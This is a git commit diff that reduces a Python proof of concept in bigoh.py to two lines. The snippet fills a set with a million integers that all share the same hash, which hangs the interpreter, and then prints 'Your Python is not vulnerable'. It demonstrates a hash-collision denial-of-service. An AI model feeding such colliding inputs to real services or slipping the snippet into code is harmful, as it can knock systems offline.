df73c8fdee0bea098643b99971f47fa8a6282f08
Gergely <gergely@unbuffered.io>
2020-08-20 20:44:43 +0200

    Turned it into a twoliner

--- bigoh.py
+++ bigoh.py
@@ -1,6 +1,3 @@
-# https://github.com/gergelykalman/bigOH - This code will not terminate in your lifetime.
-MAX = 1000000
-magic = 0x1fffffffffffffff
-ret = [i*magic for i in range(MAX)]
-set(ret)
+# this hangs Python
+set([i*0x1fffffffffffffff for i in range(1000000)])
 print("Your Python is not vulnerable")
